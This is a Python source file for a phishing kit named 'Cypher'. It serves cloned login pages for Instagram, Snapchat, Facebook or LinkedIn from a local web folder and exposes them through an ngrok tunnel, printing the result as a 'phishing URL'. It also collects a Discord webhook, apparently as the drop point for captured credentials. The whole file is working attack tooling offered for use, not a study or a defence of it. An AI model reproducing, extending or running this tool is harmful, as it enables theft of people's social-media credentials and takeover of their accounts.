from pyfiglet import Figlet
from termcolor import colored
import colorama
import random
import os
import http.server
import socketserver
import subprocess
import webbrowser
import time
import requests
import json
import re
import threading

# Initialize colorama for Windows
colorama.init()

def load_auth_token():
    token_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ngrok_token.txt')
    try:
        with open(token_file, 'r') as f:
            return f.read().strip()
    except:
        return None

def save_auth_token(token):
    token_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ngrok_token.txt')
    with open(token_file, 'w') as f:
        f.write(token)

def verify_ngrok_api(max_retries=3, delay=2):
    """Verify ngrok API is accessible with retries"""
    for i in range(max_retries):
        try:
            response = requests.get("http://localhost:4040/api/tunnels")
            if response.status_code == 200:
                return True
        except:
            if i < max_retries - 1:  # Don't sleep on last attempt
                time.sleep(delay)
    return False

def setup_ngrok_auth():
    # First try to load existing token
    token = load_auth_token()
    
    if token:
        try:
            # Try to use existing token
            result = subprocess.run(['ngrok', 'config', 'add-authtoken', token], 
                                 capture_output=True, text=True)
            if result.returncode == 0:
                # Start a test tunnel to verify token
                test_process = None
                try:
                    # Kill any existing ngrok processes first
                    if os.name == 'nt':
                        os.system('taskkill /f /im ngrok.exe 2>nul')
                    else:
                        os.system('pkill ngrok')
                    
                    time.sleep(1)
                    
                    # Start ngrok with test tunnel
                    if os.name == 'nt':
                        test_process = subprocess.Popen(f"ngrok http 9999", shell=True, 
                                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    else:
                        test_process = subprocess.Popen(['ngrok', 'http', '9999'], 
                                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    # Wait and verify API is accessible
                    if verify_ngrok_api():
                        print("✓ Using saved auth token")
                        return True
                finally:
                    if test_process:
                        test_process.terminate()
                        time.sleep(1)
                        if os.name == 'nt':
                            os.system('taskkill /f /im ngrok.exe 2>nul')
                        else:
                            os.system('pkill ngrok')
        except Exception as e:
            print(f"× Error with saved token: {str(e)}")
    
    # If we get here, either no token exists or the token didn't work
    print("\n× No valid auth token found")
    print("\nPlease get your auth token from: https://dashboard.ngrok.com/get-started/your-authtoken")
    print("Options:")
    print("[1] Enter new auth token")
    print("[2] Create new ngrok account")
    print("[3] Exit")
    
    while True:
        choice = input("\nEnter your choice: ").strip()
        
        if choice == '1':
            token = input("Enter your ngrok auth token: ").strip()
            if token:
                try:
                    result = subprocess.run(['ngrok', 'config', 'add-authtoken', token], 
                                         capture_output=True, text=True)
                    if result.returncode == 0:
                        # Verify the new token works
                        test_process = None
                        try:
                            # Kill any existing ngrok processes
                            if os.name == 'nt':
                                os.system('taskkill /f /im ngrok.exe 2>nul')
                            else:
                                os.system('pkill ngrok')
                            
                            time.sleep(1)
                            
                            # Start test tunnel
                            if os.name == 'nt':
                                test_process = subprocess.Popen(f"ngrok http 9999", shell=True, 
                                                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                            else:
                                test_process = subprocess.Popen(['ngrok', 'http', '9999'], 
                                                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                            
                            if verify_ngrok_api():
                                print("✓ Auth token configured successfully")
                                save_auth_token(token)  # Save the working token
                                return True
                            else:
                                print("× Auth token verification failed")
                        finally:
                            if test_process:
                                test_process.terminate()
                                time.sleep(1)
                                if os.name == 'nt':
                                    os.system('taskkill /f /im ngrok.exe 2>nul')
                                else:
                                    os.system('pkill ngrok')
                    else:
                        print(f"× Error configuring auth token: {result.stderr}")
                except Exception as e:
                    print(f"× Error configuring auth token: {str(e)}")
            else:
                print("× No token provided")
        elif choice == '2':
            print("\nPlease follow these steps:")
            print("1. Go to https://ngrok.com")
            print("2. Click 'Sign up'")
            print("3. Create a new account")
            print("4. Get your auth token from: https://dashboard.ngrok.com/get-started/your-authtoken")
            input("\nPress Enter when you have your new auth token...")
            continue  # Go back to token input
        elif choice == '3':
            return False
        else:
            print("Invalid choice!")
            continue
            
        # If we get here and no return happened, the token didn't work
        print("\nWould you like to:")
        print("[1] Try entering token again")
        print("[2] Create new account")
        print("[3] Exit")
        retry = input("\nEnter your choice: ").strip()
        if retry == '1':
            continue
        elif retry == '2':
            continue
        else:
            return False
    
    return False

def generate_ngrok(platform):
    # Check and install ngrok if needed
    print("\nChecking ngrok installation...")
    try:
        subprocess.run(['ngrok', '--version'], capture_output=True, check=True)
        print("✓ Ngrok is already installed")
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("× Ngrok not found. Installing...")
        try:
            os.system('curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null')
            os.system('echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list')
            os.system('sudo apt update')
            os.system('sudo apt install ngrok -y')
            print("✓ Ngrok installed successfully")
        except Exception as e:
            print(f"× Error installing ngrok: {str(e)}")
            return None
            
    # Setup ngrok authentication if needed
    if not setup_ngrok_auth():
        return None
    
    return serve_website(platform)

def serve_website(platform):
    # Get the absolute path to the web directory
    current_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Define the directory to serve based on platform
    if platform.lower() == 'instagram':
        directory = os.path.join(current_dir, 'web', 'instagram')
    elif platform.lower() == 'snapchat':
        directory = os.path.join(current_dir, 'web', 'snapchat')
    elif platform.lower() == 'facebook':
        directory = os.path.join(current_dir, 'web', 'facebook')
    elif platform.lower() == 'linkedin':
        directory = os.path.join(current_dir, 'web', 'linkedin')
    else:
        print("Invalid platform selected")
        return None

    # Change to the platform directory
    os.chdir(directory)
    
    try:
        # Start a simple HTTP server in the background
        PORT = random.randint(8000,9000)  # Random port to avoid conflicts
        
        class CustomHandler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory=directory, **kwargs)
            
            def log_message(self, format, *args):
                # Suppress log messages
                pass
                
            def do_GET(self):
                # Serve index.html for root path
                if self.path == '/':
                    self.path = '/index.html'
                return http.server.SimpleHTTPRequestHandler.do_GET(self)
        
        max_retries = 3
        httpd = None
        
        for retry in range(max_retries):
            try:
                httpd = socketserver.TCPServer(("", PORT), CustomHandler)
                print(f"\n✓ Local server started on port {PORT}")
                break
            except OSError as e:
                if retry < max_retries - 1:
                    print(f"× Port {PORT} is in use, trying another port...")
                    PORT = random.randint(9001,10000)
                else:
                    print("× Failed to find an available port after multiple attempts")
                    return None
        
        if not httpd:
            print("× Failed to start local server")
            return None
            
        # Start the server in a separate thread
        server_thread = threading.Thread(target=httpd.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        
        # Kill any existing ngrok processes
        if os.name == 'nt':  # Windows
            os.system('taskkill /f /im ngrok.exe 2>nul')
        else:  # Linux/Mac
            os.system('pkill ngrok')
        
        time.sleep(1)
        
        # Start ngrok in background
        if os.name == 'nt':  # Windows
            subprocess.Popen(f"ngrok http {PORT}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:  # Linux/Mac
            subprocess.Popen(['ngrok', 'http', str(PORT)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Wait for ngrok to start and get URL with retries
        max_url_retries = 5
        url = None
        
        for i in range(max_url_retries):
            try:
                time.sleep(2)  # Wait between attempts
                response = requests.get("http://localhost:4040/api/tunnels")
                tunnels = response.json()['tunnels']
                if tunnels:
                    url = tunnels[0]['public_url']
                    if not url.startswith('https'):
                        url = url.replace('http', 'https')
                    break
            except Exception as e:
                if i < max_url_retries - 1:
                    print("Waiting for ngrok tunnel...")
                    continue
                else:
                    print(f"× Error getting ngrok URL: {str(e)}")
                    httpd.shutdown()
                    httpd.server_close()
                    os.chdir(current_dir)
                    return None
        
        if url:
            print("\n" + "=" * 60)
            print(colored("Your phishing URL is ready:", 'yellow'))
            print(colored(url, 'green', attrs=['bold']))
            print(colored("Press Ctrl+C to stop", 'red'))
            print("=" * 60 + "\n")
            
            # Keep running until Ctrl+C
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n\nStopping server...")
                httpd.shutdown()
                httpd.server_close()
                if os.name == 'nt':
                    os.system('taskkill /f /im ngrok.exe 2>nul')
                else:
                    os.system('pkill ngrok')
                os.chdir(current_dir)  # Return to original directory
                return None
        else:
            print("× Error: Could not get ngrok URL after multiple attempts")
            print("\nTroubleshooting steps:")
            print("1. Check your internet connection")
            print("2. Make sure no other ngrok instances are running")
            print("3. Try running with sudo: sudo python3 main.py")
            print("4. Verify your auth token is correct")
            httpd.shutdown()
            httpd.server_close()
            os.chdir(current_dir)
            return None
            
    except Exception as e:
        print(f"\n× Error: {str(e)}")
        print("\nTroubleshooting steps:")
        print("1. Make sure your auth token is correct")
        print("2. Check your internet connection")
        print("3. Make sure no other ngrok instances are running")
        print("4. Try running with sudo: sudo python3 main.py")
        if 'httpd' in locals() and httpd:
            httpd.shutdown()
            httpd.server_close()
        os.chdir(current_dir)
        return None

def print_menu():
    # Create a Figlet object with a different font style
    figlet = Figlet(font='slant')
    
    # Text to display
    text = "Cypher"
    
    # Generate the ASCII art
    ascii_art = figlet.renderText(text)
    
    # Colors for rainbow effect
    colors = ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta']
    
    # Get the width and height of the ASCII art
    ascii_lines = ascii_art.split('\n')
    max_width = max(len(line) for line in ascii_lines)
    height = len(ascii_lines)
    
    # Create decorative frame with proper width
    frame_width = max_width + 20  # Increased padding
    frame_width = frame_width + (frame_width % 2)  # Make sure width is even
    
    # Create borders and empty lines
    top_border = colored('╔' + '═' * (frame_width-2) + '╗', 'cyan')
    bottom_border = colored('╚' + '═' * (frame_width-2) + '╝', 'cyan')
    empty_line = colored('║' + ' ' * (frame_width-2) + '║', 'cyan')
    
    # Create decorative top and bottom bars
    top_decoration = '█' + '▀' * (frame_width-4) + '█'
    bottom_decoration = '█' + '▄' * (frame_width-4) + '█'
    
    # Build the final output with background
    final_art = [
        top_border,
        colored('║' + top_decoration + '║', 'cyan'),
        empty_line
    ]
    
    # Add the rainbow text with centered alignment
    color_index = 0
    for line in ascii_lines:
        if line.strip():
            padding = (frame_width - 2 - len(line)) // 2
            colored_line = colored(line, colors[color_index % len(colors)])
            right_padding = frame_width - 2 - padding - len(line)
            final_line = colored('║', 'cyan') + ' ' * padding + colored_line + ' ' * right_padding + colored('║', 'cyan')
            final_art.append(final_line)
            color_index += 1
        else:
            final_art.append(empty_line)
    
    # Add menu options with better formatting
    menu_options = [
        colored("[ Select your target ]", 'yellow'),
        "",
        colored("[1]", 'cyan') + " Instagram",
        colored("[2]", 'cyan') + " Snapchat",
        colored("[3]", 'cyan') + " Facebook",
        colored("[4]", 'cyan') + " LinkedIn",
        colored("[5]", 'cyan') + " Exit",
        "",
        colored("Enter your choice: ", 'white')
    ]
    
    # Add menu options with proper centering
    for option in menu_options[:-1]:
        padding = (frame_width - 2 - len(option)) // 2
        final_line = colored('║', 'cyan') + ' ' * padding + option + ' ' * (frame_width - 2 - padding - len(option)) + colored('║', 'cyan')
        final_art.append(final_line)
    
    final_art.extend([
        empty_line,
        colored('║' + bottom_decoration + '║', 'cyan'),
        bottom_border
    ])
    
    # Add matrix-style side decorations with adjusted spacing
    side_dec_left = [
        colored('░▒▓█', 'green') + ' ',
        colored('▓▒░█', 'green') + ' ',
        colored('░▒▓█', 'green') + ' '
    ]
    
    side_dec_right = [
        ' ' + colored('█▓▒░', 'green'),
        ' ' + colored('█░▒▓', 'green'),
        ' ' + colored('█▓▒░', 'green')
    ]
    
    # Print the final composition with side decorations
    for i, line in enumerate(final_art):
        if i > 0 and i < len(final_art) - 1:
            left_dec = side_dec_left[i % len(side_dec_left)]
            right_dec = side_dec_right[i % len(side_dec_right)]
            print(left_dec + line + right_dec)
        else:
            print(line)
    
    # Add bottom matrix rain effect with adjusted width
    matrix_bottom = ''.join(colored('▀▄'[(i+random.randint(0,1))%2], 'green') for i in range(frame_width))
    print(' ' * 4 + matrix_bottom)
    
    return input(colored(menu_options[-1], 'white'))

def serve_localhost(platform):
    # Get the absolute path to the web directory
    current_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Define the directory to serve based on platform
    if platform.lower() == 'instagram':
        directory = os.path.join(current_dir, 'web', 'instagram')
    elif platform.lower() == 'snapchat':
        directory = os.path.join(current_dir, 'web', 'snapchat')
    elif platform.lower() == 'facebook':
        directory = os.path.join(current_dir, 'web', 'facebook')
    elif platform.lower() == 'linkedin':
        directory = os.path.join(current_dir, 'web', 'linkedin')
    else:
        print("Invalid platform selected")
        return None

    # Change to the platform directory
    os.chdir(directory)
    
    try:
        # Start a simple HTTP server in the background
        PORT = random.randint(8000,9000)  # Random port to avoid conflicts
        
        class CustomHandler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory=directory, **kwargs)
            
            def log_message(self, format, *args):
                # Suppress log messages
                pass
                
            def do_GET(self):
                # Serve index.html for root path
                if self.path == '/':
                    self.path = '/index.html'
                return http.server.SimpleHTTPRequestHandler.do_GET(self)
        
        max_retries = 3
        httpd = None
        
        for retry in range(max_retries):
            try:
                httpd = socketserver.TCPServer(("", PORT), CustomHandler)
                print(f"\n✓ Local server started on port {PORT}")
                break
            except OSError as e:
                if retry < max_retries - 1:
                    print(f"× Port {PORT} is in use, trying another port...")
                    PORT = random.randint(9001,10000)
                else:
                    print("× Failed to find an available port after multiple attempts")
                    return None
        
        if not httpd:
            print("× Failed to start local server")
            return None
            
        # Start the server in a separate thread
        server_thread = threading.Thread(target=httpd.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        
        # Open the URL in default browser
        url = f"http://localhost:{PORT}"
        print("\n" + "=" * 60)
        print(colored("Your localhost URL is ready:", 'yellow'))
        print(colored(url, 'green', attrs=['bold']))
        print(colored("Press Ctrl+C to stop", 'red'))
        print("=" * 60 + "\n")
        
        # Open in browser
        webbrowser.open(url)
        
        # Keep running until Ctrl+C
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\nStopping server...")
            httpd.shutdown()
            httpd.server_close()
            os.chdir(current_dir)  # Return to original directory
            return None
            
    except Exception as e:
        print(f"\n× Error: {str(e)}")
        if 'httpd' in locals() and httpd:
            httpd.shutdown()
            httpd.server_close()
        os.chdir(current_dir)
        return None

def generate_link(platform):
    print("\n" + "=" * 60)
    print(colored("Link Generation Method", 'yellow'))
    print("=" * 60)
    print("\nOptions:")
    print(colored("[1]", 'cyan') + " Ngrok (Public URL)")
    print(colored("[2]", 'cyan') + " Localhost (Local Network)")
    print(colored("[3]", 'cyan') + " Back")
    
    while True:
        choice = input("\nEnter your choice: ").strip()
        
        if choice == '1':
            return generate_ngrok(platform)
        elif choice == '2':
            return serve_localhost(platform)
        elif choice == '3':
            return None
        else:
            print(colored("\n× Invalid choice!", 'red'))

def load_webhook():
    webhook_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'webhook.txt')
    try:
        with open(webhook_file, 'r') as f:
            return f.read().strip()
    except:
        return None

def save_webhook(webhook_url):
    webhook_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'webhook.txt')
    with open(webhook_file, 'w') as f:
        f.write(webhook_url)

def setup_webhook():
    # First try to load existing webhook
    webhook = load_webhook()
    
    if webhook:
        print("\n" + "=" * 60)
        print(colored("Found existing webhook URL", 'yellow'))
        print("=" * 60)
        print("\nOptions:")
        print(colored("[1]", 'cyan') + " Use existing webhook")
        print(colored("[2]", 'cyan') + " Change webhook URL")
        print(colored("[3]", 'cyan') + " Exit")
        
        while True:
            choice = input("\nEnter your choice: ").strip()
            
            if choice == '1':
                print(colored("\n✓ Using existing webhook URL", 'green'))
                return webhook
            elif choice == '2':
                print("\n" + "=" * 60)
                print(colored("Enter New Discord Webhook URL", 'yellow'))
                print("=" * 60)
                print("\n" + colored("Format:", 'cyan') + " https://discord.com/api/webhooks/...")
                new_webhook = input("\nWebhook URL: ").strip()
                if new_webhook:
                    save_webhook(new_webhook)
                    print(colored("\n✓ New webhook URL saved successfully", 'green'))
                    return new_webhook
                else:
                    print(colored("\n× No webhook URL provided", 'red'))
                    return None
            elif choice == '3':
                return None
            else:
                print(colored("\n× Invalid choice!", 'red'))
    else:
        print("\n" + "=" * 60)
        print(colored("Discord Webhook Setup", 'yellow'))
        print("=" * 60)
        print("\n" + colored("Instructions:", 'cyan'))
        print("1. Open Discord")
        print("2. Go to Server Settings")
        print("3. Select Integrations")
        print("4. Create Webhook")
        print("5. Copy Webhook URL")
        print("\n" + colored("Format:", 'cyan') + " https://discord.com/api/webhooks/...")
        
        webhook = input("\nEnter your Discord webhook URL: ").strip()
        if webhook:
            save_webhook(webhook)
            print(colored("\n✓ Webhook URL saved successfully", 'green'))
            return webhook
        else:
            print(colored("\n× No webhook URL provided", 'red'))
            return None

def main():
    while True:
        print_menu()  # Just show the menu first
        
        # Ask for webhook URL before platform selection
        webhook_url = setup_webhook()
        if not webhook_url:
            print(colored("\nExiting... No webhook URL provided", 'red'))
            return
            
        # Now get the platform choice
        choice = input("\nEnter your choice: ").strip()
        
        if choice == '1':
            generate_link('instagram')
        elif choice == '2':
            generate_link('snapchat')
        elif choice == '3':
            generate_link('facebook')
        elif choice == '4':
            generate_link('linkedin')
        elif choice == '5':
            print(colored("\nExiting...", 'yellow'))
            # Kill any running ngrok process
            if os.name == 'nt':
                os.system('taskkill /f /im ngrok.exe 2>nul')
            else:
                os.system('pkill ngrok')
            break
        else:
            print(colored("\n× Invalid choice!", 'red'))
            print(colored("Press Enter to continue...", 'yellow'))
            input()
        
        # Clear screen for Windows
        os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == "__main__":
    main() 